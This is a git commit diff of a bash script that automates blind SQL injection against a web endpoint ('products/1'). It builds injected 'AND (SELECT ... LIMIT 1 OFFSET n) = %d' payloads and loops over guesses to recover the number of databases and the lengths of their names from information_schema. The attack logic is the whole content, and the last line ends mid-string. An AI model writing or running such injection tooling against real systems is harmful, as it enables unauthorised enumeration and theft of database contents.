22b524505a830675190f406a434464ae544d1c35
Bayo Al-Ba <bayo@Bayos-MacBook-Pro.local>
2024-02-15 00:16:24 +0100

    [blindSqlNew.sh] getLength of names working

--- blindSqlNew.sh
+++ blindSqlNew.sh
@@ -1,32 +1,23 @@
 #!/bin/bash
-# get number of tables inside a database:
-# the number will start to count by 1 single table is equal to 1!
-# (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = '<database>') > 0
 
-# get the number of columns inside a table
-# (SELECT COUNT(*) FROM <table>) > 0
-
-# get the length of a column name
-# (SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_schema = <table_name>)
-
-# use the length to guess the name of the table
-
+declare -A object
 MYSQL_STANDARD_DATABASES=('mysql','information_schema')
 
 function loopThrow() {
 	START=1
 	END=100
 	placeholderSqli="$1"
-	for (( index=$START; index<=$END; index++)); do
+	for (( index=$START; index<=$END; index++  )); do
 		sqli="$(printf "${placeholderSqli}" "$index")"
 		request "$sqli"
                 result=$(echo $?)
                 if [ $result -eq 0 ]; then
-                        echo $index
+                        object['lengthOfDatabaseNames']+="$index "
                         break
                 fi
 	done
 }
+
 
 function getLength() {
 	echo 'i get you the length'
@@ -36,7 +27,7 @@ function getLength() {
 	# IT Create from three parameter the sqli!
 
 	START_Y=1
-        END_Y=$2
+        END_Y="${object['amountOfDatabases']}"
 	sqlQuery="$1"
 
 	for (( indey=$START_Y; indey<=$END_Y; indey++)); do
@@ -44,6 +35,7 @@ function getLength() {
 		sqli="AND (${sqlQuery} LIMIT 1 OFFSET $count) = %d"
 		loopThrow "$sqli"
 	done
+	echo "${object['lengthOfDatabaseNames']}"
 }
 
 function encodeToUrl() {
@@ -122,4 +114,5 @@ PATH="products/1"
 #amountOfDatabases=$(getAmount 'SELECT COUNT(*) FROM information_schema.schemata')
 #echo "There are ${amountOfDatabases} in the server"
 # es sind 5 databases drinne!
-getLength 'SELECT length(schema_name) FROM information_schema.schemata' '5'
+object['amountOfDatabases']='5'
+getLength 'SELECT length(schema_name) FROM information_schema.schemata
